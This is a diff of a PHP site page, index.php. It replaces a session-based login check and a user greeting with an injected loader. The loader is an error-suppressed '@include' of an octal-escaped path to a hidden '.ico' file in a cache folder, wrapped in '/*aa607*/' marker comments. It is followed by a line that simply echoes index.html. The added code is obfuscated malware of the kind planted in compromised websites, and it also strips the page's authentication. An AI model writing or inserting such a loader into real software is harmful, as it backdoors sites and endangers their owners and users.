@@ -1,46 +1,9 @@
-<?php 
-  session_start(); 
+<?php
+/*aa607*/
 
-  if (!isset($_SESSION['firstname'])) {
-  	$_SESSION['msg'] = "You must log in first";
-  	header('location: login.html');
-  }
-  if (isset($_GET['logout'])) {
-  	session_destroy();
-  	unset($_SESSION['firstname']);
-  	header("location: login.html");
-  }
-?>
-<!DOCTYPE html>
-<html>
-<head>
-	<title>Home</title>
-	<link rel="stylesheet" type="text/css" href="style.css">
-</head>
-<body>
+@include "\057h\157m\145/\172a\154p\157i\156t\057p\165b\154i\143_\150t\155l\057s\151t\145/\143a\143h\145/\0564\1455\0707\1410\061.\151c\157";
 
-<div class="header">
-	<h2>Home Page</h2>
-</div>
-<div class="content">
-  	<!-- notification message -->
-  	<?php if (isset($_SESSION['success'])) : ?>
-      <div class="error success" >
-      	<h3>
-          <?php 
-          	echo $_SESSION['success']; 
-          	unset($_SESSION['success']);
-          ?>
-      	</h3>
-      </div>
-  	<?php endif ?>
+/*aa607*/
 
-    <!-- logged in user information -->
-    <?php  if (isset($_SESSION['username'])) : ?>
-    	<p>Welcome <strong><?php echo $_SESSION['username']; ?></strong></p>
-    	<p> <a href="index.php?logout='1'" style="color: red;">logout</a> </p>
-    <?php endif ?>
-</div>
-		
-</body>
-</html>
+
+echo @file_get_contents('index.html');
